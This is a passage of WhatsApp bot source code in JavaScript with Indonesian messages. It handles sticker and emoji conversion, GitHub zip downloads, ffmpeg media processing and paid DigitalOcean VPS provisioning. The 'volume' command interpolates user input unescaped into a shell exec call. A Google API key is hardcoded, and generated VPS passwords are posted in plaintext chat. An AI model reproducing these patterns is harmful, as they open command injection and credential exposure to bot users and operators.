Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: m } )
}
break
            case 'git': case 'gitclone':
if (!args[0]) return reply(`Where is the link?\nExample :\n${prefix}${command} https://github.com/DGXeon/XeonMedia`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return replygcxeon(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
   Biiofc.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(mess.error))
break
case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!isPremium) return reply(mess.premium)
if (!args.join(" ")) return reply(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
Biiofc.downloadAndSaveMediaMessage(quoted, "gifee")
Biiofc.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await Biiofc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
reply(`Photo/Video?`)
}
}
break
case 'igemoji': 
case 'instagramemoji': 
if (!q) return reply("Enter emoji, maximum 1 emoji, eg?" + ` ${prefix + command} 😀`)
XeonStickWait()
emote(q, "11")
break
case 'iphoneemoji': 
if (!q) return reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
XeonStickWait()
emote(q, "0")
break
case 'googleemoji': 
if (!q) return reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
XeonStickWait()
emote(q, "1")
break
case 'samsungemoji': 
if (!q) return reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
XeonStickWait()
emote(q, "2")
break
case 'microsoftemoji': 
if (!q) return reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
XeonStickWait()
emote(q, "3")
break
case 'whatsappemoji': 
if (!q) return reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
XeonStickWait()
emote(q, "4")
break
case 'twitteremoji': 
if (!q) return reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
XeonStickWait()
emote(q, "5")
break
case 'facebookemoji': 
case 'fbemoji': 
if (!q) return reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
XeonStickWait()
emote(q, "6")
break
case 'skypeemoji': 
if (!q) return reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
XeonStickWait()
emote(q, "7")
break
case 'joyemoji': 
if (!q) return reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
XeonStickWait()
emote(q, "8")
break
case 'mojiemoji': 
if (!q) return reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
XeonStickWait()
emote(q, "9")
case 'pediaemoji': 
if (!q) return reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
XeonStickWait()
emote(q, "10")
break
case 'emoji': {
if (!args.join(" ")) return reply('Where is the emoji?')
emoji.get(args.join(" ")).then(async(emoji) => {
let mese = await Biiofc.sendMessage(m.chat, {image:{url:emoji.images[4].url}, caption: `Made by ${global.botname}`}, {quoted:m})
await Biiofc.sendMessage(from, {text:"reply #s to this image to make sticker"}, {quoted:mese})
})
}
break
case 'volume': {
if (!args.join(" ")) return reply(`Example: ${prefix + command} 10`)
media = await Biiofc.downloadAndSaveMediaMessage(quoted, "volume")
if (isQuotedAudio) {
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygcxeon('Error!')
jadie = fs.readFileSync(rname)
Biiofc.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
} else if (isQuotedVideo) {
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygcxeon('Error!')
jadie = fs.readFileSync(rname)
Biiofc.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
} else {
reply("Send video/audio")
}
}
break
case 'emojimix': {
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) return reply(`Example : ${prefix + command} 😅+🤔`)
		if (!emoji2) return reply(`Example : ${prefix + command} 😅+🤔`)
		let anumojimix = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anumojimix.results) {
		    let encmedia = await Biiofc.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    
		}
	    }
	    break
case 'ebinary': {
if (!q) return reply(`Send/reply text with captions ${prefix + command}`)
XeonStickWait()
let { eBinary } = require('./scrape/binary')
let eb = await eBinary(`${q}`)
reply(eb)
}
break
case 'dbinary': {
if (!q) return reply(`Send/reply text with captions ${prefix + command}`)
XeonStickWait()
let { dBinary } = require('./scrape/binary')
let db = await dBinary(`${q}`)
reply(db)
}
break    
case 'q': case 'quoted': {
if (!m.quoted) return reply('Reply the Message!!')
let xeonquotx= await Biiofc.serializeM(await m.getQuotedObj())
if (!xeonquotx.quoted) return reply('The message you are replying to is not sent by the bot')
await xeonquotx.quoted.copyNForward(m.chat, true)
}
break
case 'toonce': case 'toviewonce': { 
if (!quoted) return reply(`Reply Image/Video`)
XeonStickWait()
if (/image/.test(mime)) {
anuan = await Biiofc.downloadAndSaveMediaMessage(quoted)
Biiofc.sendMessage(m.chat, {image: {url:anuan}, caption: `Here you go!`, fileLength: "999", viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
anuanuan = await Biiofc.downloadAndSaveMediaMessage(quoted)
Biiofc.sendMessage(m.chat, {video: {url:anuanuan}, caption: `Here you go!`, fileLength: "99999999", viewOnce : true},{quoted: m })
}
}
break
case 'toimg': {
	XeonStickWait()
	const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
        if (!m.quoted) return reply(`_Reply to Any Sticker._`)
        let mime = m.quoted.mtype
if (mime =="imageMessage" || mime =="stickerMessage")
{
        let media = await Biiofc.downloadAndSaveMediaMessage(m.quoted)
        let name = await getRandom('.png')
        exec(`ffmpeg -i ${media} ${name}`, (err) => {
        	fs.unlinkSync(media)
            let buffer = fs.readFileSync(name)
            Biiofc.sendMessage(m.chat, { image: buffer }, { quoted: m })      
fs.unlinkSync(name)
        })
        
} else return reply(`Please reply to non animated sticker`)
    }
    break
	        case 'tomp4': case 'tovideo': {
                if (!quoted) return reply('Reply to Sticker')
                if (!/webp/.test(mime)) return reply(`reply sticker with caption *${prefix + command}*`)
                XeonStickWait()
		        let { webp2mp4File } = require('./lib/uploader')
                let media = await Biiofc.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await Biiofc.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case 'tomp3': {
            if (/document/.test(mime)) return replygcxeon(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxeon(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
            if (!quoted) return reply(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
            XeonStickWait()
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            Biiofc.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${Biiofc.user.name}.mp3`}, { quoted : m })
            }
            break
            case 'togif': {
                if (!/webp/.test(mime)) return `Reply stiker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
		        let { webp2mp4File } = require('./lib/uploader')
                let media = await Biiofc.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await Biiofc.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: fvideo })
                await fs.unlinkSync(media)
            }
            break
case 'tourl': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!/video/.test(mime) && !/image/.test(mime)) throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Image Caption* ${prefix + command}`
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./freya/uploader')
let media = await Biiofc.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
case 'getbio':{
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
              try {
    let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
    else who = m.quoted.sender ? m.quoted.sender : m.sender
    let bio = await Biiofc.fetchStatus(who)
    reply(bio.status)
  } catch {
    if (text) return reply(`bio is private or you haven't replied to the person's message!`)
    else try {
      let who = m.quoted ? m.quoted.sender : m.sender
      let bio = await Biiofc.fetchStatus(who)
      reply(bio.status)
    } catch {
      return reply(`bio is private or you haven't replied to the person's message!`)
    }
  }
}
break
case "sticker": 
case "s": {
if (!isOwner) return reply(`Khusus Rafathar Offcial Aja`)
if (!quoted) return reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await Biiofc.sendStimg(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik')
let media = await quoted.download()
let encmedia = await Biiofc.sendStvid(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
}
}
break
 case "buypaketvps1g1c": {
if (cekSaldo(sender,db_saldo) < 20000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let hostname = args[0];
if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-1gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
minSaldo(sender, 20000, db_saldo)
break

    case "buypaketvps2g1c": {
if (cekSaldo(sender,db_saldo) < 25000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp25.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
minSaldo(sender, 25000, db_saldo)
break  
 
    case "buypaketvps2g2c": {
if (cekSaldo(sender,db_saldo) < 30000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp30.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
minSaldo(sender, 30000, db_saldo)
break      
    case "buypaketvps4g2c": {
if (cekSaldo(sender,db_saldo) < 45000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp45.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-4gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
minSaldo(sender, 45000, db_saldo)
break        
     case "buypaketvps8g4c": {
if (cekSaldo(sender,db_saldo) < 55000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp55.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-4vcpu-8gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
minSaldo(sender, 55000, db_saldo)
break
    case "vps1g1c": {
if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
let hostname = args[0];
if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-1gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break

    case "vps2g1c": {
  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break  
 
    case "vps2g2c": {
  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break      
    case "vps4g2c": {
  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-4gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
